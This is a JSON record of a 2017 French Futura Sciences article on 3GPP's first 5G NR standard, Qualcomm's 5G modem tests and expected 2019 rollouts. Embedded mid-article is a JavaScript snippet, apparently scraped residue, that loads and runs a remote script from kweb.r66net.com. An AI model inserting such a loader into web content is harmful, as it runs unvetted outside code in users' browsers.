{"title": "5G : une etape cruciale pour un deploiement des 2019", "newspaper": "Futura Sciences", "author": ["Par Futura avec l'AFP-Relaxnews"], "date_publi": "2017-12-27", "content": "Une etape cle, le choix du spectre des frequences a utiliser par les reseaux de telephonie << 5G >>, vient d'etre franchie par la 3GPP, l'instance en charge de l'elaboration des standards de telecommunication. La derniere phase de specifications techniques devrait etre achevee cet ete. Cette premiere norme  5G NR  ( New  Radio ) que vient d'arreter la  3GPP  ouvre de fait la voie a des essais a grande echelle, sur la base des infrastructures deja existantes, pour de possibles deploiements commerciaux des 2019. Toutefois, l'ensemble des specifications techniques relatives a la 5G NR ne devrait etre finalise qu'a l'ete 2018. Pour l'utilisateur, cette nouvelle generation devrait se traduire par une connexion au moins dix fois plus rapide que l'actuelle  4G . La 5G devra en outre repondre a de nouveaux usages, comme le  streaming  en tres haute definition, la democratisation des objets connectes et le developpement de la  realite virtuelle  ou augmentee, sans oublier l'essor de la  voiture  connectee (plus ou moins) autonome.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La 5G en vedette du  Mobile World Congress Cela necessitera evidemment le deploiement d'un reseau adapte ainsi que la commercialisation de terminaux compatibles  5G . A cet effet, Qualcomm a d'ores et deja realise une premiere demonstration d'une connexion 5G sur une puce  modem  installee dans un  smartphone  de test. Ce Qualcomm Snapdragon X50 5G a deja permis a la societe americaine d'obtenir des  debits  superieurs a 1 Gb/s (gigabit par seconde) en telechargement sur la bande de 28 GHz, l'objectif etant d'atteindre les 5 Gb/s en 2018 et de proposer les premiers terminaux compatibles des le premier semestre 2019. En France, les differents operateurs s'y preparent deja et travaillent avec Ericsson ou encore Nokia pour evaluer les infrastructures a mettre en place. Historiquement, les tout premiers tests relatifs a la 5G datent de 2014 au Japon avec  NTT  Docomo, en collaboration avec Fujitsu, NEC, Samsung, Alcatel-Lucent,  Ericsson  et Nokia. De nombreuses annonces sont attendues concernant le developpement de la 5G et des reseaux du futur ainsi que sur les contenus et la securite associes lors du prochain  Mobile World Congress , qui se tiendra a Barcelone (Espagne) du 26 fevrier au 1 er  mars 2018. ", "theme": "tech"}